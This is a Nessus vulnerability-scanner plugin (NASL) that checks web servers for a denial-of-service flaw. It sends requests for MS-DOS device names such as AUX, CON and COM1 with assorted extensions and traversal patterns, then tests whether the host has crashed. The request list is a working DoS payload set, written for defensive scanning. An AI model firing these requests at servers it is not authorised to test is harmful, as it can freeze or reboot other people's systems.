#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive, Microsoft Knowledgebase,
#      and known vulnerable servers list
#
# Vulnerable servers:
# vWebServer v1.2.0 (and others?)
# AnalogX SimpleServer:WWW 1.08		CVE-2001-0386
# Small HTTP server 2.03		CVE-2001-0493
# acWEB HTTP server?
# Xitami Web Server                     BID:2622, CVE-2001-0391
# Jana Web Server                       BID:2704, CVE-2001-0558
# Cyberstop Web Server                  BID:3929, CVE-2002-0200
# General Windows MS-DOS Device         BID:1043, CVE-2000-0168
# Apache < 2.0.44			CVE-2003-0016
# Domino 5.0.7 and earlier		CVE-2001-0602, BID: 2575
# Darwin Streaming Server v4.1.3e	CVE-2003-0421
# Darwin Streaming Server v4.1.3f 	CVE-2003-0502
#



include("compat.inc");

if(description)
{
 script_id(10930);
 script_version("$Revision: 1.33 $");
 if (NASL_LEVEL >= 2200 ) script_cve_id("CVE-2001-0386", "CVE-2001-0493", "CVE-2001-0391", "CVE-2001-0558", "CVE-2002-0200", 
                                        "CVE-2000-0168", "CVE-2003-0016", "CVE-2001-0602");
 script_bugtraq_id(1043, 2575, 2608, 2622, 2649, 2704, 3929, 6659, 6662);
 script_xref(name:"IAVA", value:"2003-t-0003");
 script_xref(name:"OSVDB", value:"1817");
 script_xref(name:"OSVDB", value:"3781");

 script_name(english:"Multiple Web Server on Windows MS/DOS Device Request Remote DOS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a Web Server that is affected by a denial
of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to freeze or reboot Windows by reading a MS/DOS device
through HTTP, using a file name like CON\CON, AUX.htm, or AUX. An
attacker could exploit this flaw to deny service to the affected
system." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-04/0279.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2001-05/0086.html" );
 script_set_attribute(attribute:"solution", value:
"Contact your vendor for fixes." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

 script_end_attributes();
 
 script_summary(english:"Crashes Windows 98");
 script_category(ACT_KILL_HOST);
 script_copyright("This script is Copyright (C) 2001-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencies("find_service1.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


if ( report_paranoia < 2 ) exit(0);


start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

i = 0;
ext[i++] = ".htm";	# Should we add .html ?
ext[i++] = ".";
ext[i++] = ". . .. ... .. .";
ext[i++] = ".asp";
ext[i++] = ".foo";
ext[i++] = ".bat";
# Special meanings
ext[i++] = "-";		# /../ prefix
ext[i++] = "+";		# /aux/aux pattern

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit (0);

 n = 0;
 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "+")
    name = string("/", d, "/", d);
   else if (e == "-")
    # Kills Darwin Streaming Server v4.1.3f and earlier (Win32 only)
    name = string("/../", d);
   else
    name = string("/", d, e);
   #display(n++, ": ", name, "\n");
   r = http_send_recv3(method: "GET", item:name, port:port);
  }
 }
 
alive = end_denial();					     
if(!alive)
{
 security_warning(port);
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}

if (http_is_dead(port: port))
{
  security_warning(port);
}
